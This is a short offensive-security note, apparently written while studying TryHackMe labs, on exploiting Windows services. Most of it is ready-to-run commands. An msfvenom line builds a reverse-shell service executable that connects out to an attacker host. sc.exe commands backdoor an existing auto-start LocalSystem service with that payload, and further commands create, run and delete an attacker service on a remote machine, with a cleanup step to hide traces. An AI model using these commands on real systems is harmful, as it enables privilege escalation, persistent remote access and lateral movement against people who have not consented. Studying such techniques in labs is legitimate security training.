# Exploiting Windows Services
Note that Windows services need to use an additional set of API calls that are not normally implemented in regular executables. While it *is* possible to run a normal executable as a service, the command will not survive for long (making a stable reverse shell impossible) and will always registered as failed (potentially alerting defenders).

## Backdooring Existing Services
Existing Windows services can have backdoors added to them using `msfvenom`. Begin by finding a candidate service:

```powershell
# Get a list of all available services
#
sc.exe query state=all

# Query information about an existing service. We want a
# service with three properties:
#
#    1. The BINARY_PATH_NAME points to our payload,
#    2. The START_TYPE is "auto" so it runs without user
#       interaction, and
#    3. The SERVICE_START_NAME (the account which the service
#       runs under) is "LocalSystem".
#
# Note that not every service can be queried, however; the
# ability to do so is controlled by a special per-service
# permission (a Discressionary Access Control List, or DACL).
#
sc.exe qc $SERVICE_NAME
```

Create a replacement service file using `msfvenom` (alternately, a backdoor could be added directly to the binary):

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
	LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
	-f exe-service -o $SERVICE_EXE
```

(The use of `exe-service` here rather than `exe` ensures that the correct APIs are available.)

Finally, update the service definition:

```powershell
# NOTE: A space is required after equals signs for this
# command! It’s not just a weird typo below!
#
sc.exe config $SERVICE_NAME `
	binPath= "$PATH_TO_REVERSE_SHELL_EXE" `
	start= auto obj= "LocalSystem"`
```

## Creating Service Remotely
> **Note:** By default, UAC restricts remote `sc.exe` calls to domain admins and the default local “Administrator” account. *Local Windows admins cannot call this service remotely without first disabling UAC!*

The `sc.exe` command can also be used to create and manipulate services on *remote* machines. This uses the Windows RPC (TCP 135), but will fall back to named pipes over SMB (TCP 445) or NetBIOS (TCP 139). (In fact, this is how `sc.exe` works locally as well; the only difference is that in this case a local named pipe is always used.)

```powershell
# Create $ATTACKER_SERVICE on the $TARGET_HOST.
#
sc.exe \\$TARGET_HOST create $ATTACKER_SERVICE `
                      binPath= "$SOME_COMMAND" start= auto

# Invoke $ATTACKER_SERVICE.
#
sc.exe \\$TARGET_HOST start $ATTACKER_SERVICE

# Make sure that $ATTACKER_SERVICE is really dead.
#
sc.exe \\$TARGET_HOST stop $ATTACKER_SERVICE

# Clean up after yourself.
#
sc.exe \\$TARGET_HOST delete $ATTACKER_SERVICE
```

Note that this is a blind attack — there will be no output indicating success or failure.

## Service Security
Service configurations are stored in the Registry under `HKLM\SYSTEM\CurrentControlSet\Services`; here the user is represented by the `ObjectName` value. DACLs are stored under each service as a `Security` sub-key.

## Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)
* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 
* [Using Metasploit](./Using%20Metasploit.md)
* [Using “netcat”](./Using%20%22netcat%22.md)
* [TryHackMe: Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)
